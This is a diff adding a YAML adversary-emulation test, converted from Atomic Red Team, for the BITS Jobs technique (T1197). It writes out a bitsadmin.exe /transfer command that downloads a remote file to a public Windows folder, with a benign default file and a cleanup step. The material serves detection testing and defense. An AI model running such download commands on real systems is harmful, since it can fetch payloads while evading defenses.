@@ -1,0 +1,46 @@
+# Converted from Atomic Red Team - BITS Jobs
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1197
+# Original auto_generated_guid: 3c73d728-75fb-4180-a12f-6712864d7421
+
+---
+api_version: 2.0
+uuid: 894a0bca-11a9-401f-a5d4-e67fe40a162c
+name: Bitsadmin Download
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  This test simulates an adversary leveraging bitsadmin.exe to download
+  and execute a payload
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1197 BITS Jobs"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+args:
+  - name: remote_file
+    description: Remote file to download
+    type: string
+    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt"
+  - name: local_file
+    description: Local file path to save downloaded file
+    type: path
+    default: "C:\\Users\\Public\\malicious.bin"
+
+steps:
+  - name: download_file_with_bitsadmin
+    executor: cmd.exe
+    inline: |
+      bitsadmin.exe /transfer /Download /priority Foreground {{.Args.remote_file}} {{.Args.local_file}}
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        del {{.Args.local_file}} >nul 2>&1
